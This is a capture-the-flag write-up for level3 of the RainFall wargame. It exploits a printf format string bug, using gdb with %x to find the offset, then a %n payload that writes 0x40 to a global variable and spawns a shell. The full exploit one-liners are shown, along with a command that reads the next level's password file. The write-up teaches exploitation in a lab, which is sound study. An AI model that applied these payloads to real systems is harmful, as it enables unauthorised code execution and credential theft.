We see that main call a function v and that we have to find the right conditions to set the variable `m` to `0x40` to activate a shell.

`fgets()` mitigates the problem we had before with `gets()` by specifying the maximum string length.

The function `printf()` fetches the arguments from the stack. Unless the stack is marked with a boundary, `printf()` does not know that it runs out of the arguments that are provided to it. It maintains an initial stack pointer, so it knows the location of the parameters in the stack. In a miss-match case, it will fetch some data that do not belong to this function call.

```
0x080484d5      call printf        ; sym.imp.printf ; int printf(const char *format)
0x080484da      mov eax, dword [m] ; 0x804988c
0x080484df      cmp eax, 0x40      ; 64
```

We need to set the value of `m` at the address `0x804988c` to `0x40`. 

In gdb :
Let's print a bunch of characters and a bunch of addresses thanks to the `%x` specifier (hexadecimal values) that causes the stack pointer to move towards the format string as `printf` considers them as arguments.

```
(gdb) run <<< $(python -c "print 'A' * 20 + '%x ' * 10")
Starting program: /home/user/level3/level3 <<< $(python -c "print 'A' * 20 + '%x ' * 10")
AAAAAAAAAAAAAAAAAAAA200 b7fd1ac0 b7ff37d0 41414141 41414141 41414141 41414141 41414141 25207825 78252078
```

It overflows at offset 4 and we can reach that value by writing `%4\$x` after the format string. Now, we want to write our target address `m => 0x804988c` at this place.

We need to have `64` bytes as a value to pass the `cmp`.
We can do this with the `%n` : it's a special format specifier which instead of printing something causes `printf()` to load the variable pointed by the corresponding argument with a value equal to the number of characters that have been printed by `printf()` before the occurrence of `%n`.

`64` - `4` of the target address.

```
(gdb) r <<< $(python -c "print '\x8c\x98\x04\x08' + 60 * 'A' + '%4\$n'")
Starting program: /home/user/level3/level3 <<< $(python -c "print '\x8c\x98\x04\x08' + 60 * 'A' + '%4\$n'")
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
```
or with another specifier : `%[number]` minimum width of number spaces, which, by default, will be right-justified
```
(gdb) r <<< $(python -c "print '\x8c\x98\x04\x08' + '%60d%4\$n'")
Starting program: /home/user/level3/level3 <<< $(python -c "print '\x8c\x98\x04\x08' + '%60d%4\$n'")
�                                                         512
Wait what?!
```

Type it in the terminal :
```
level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "%60d%4$n"' && cat) | ./level3
�                                                         512
Wait what?!
whoami
level4
cat /home/user/level4/.pass
```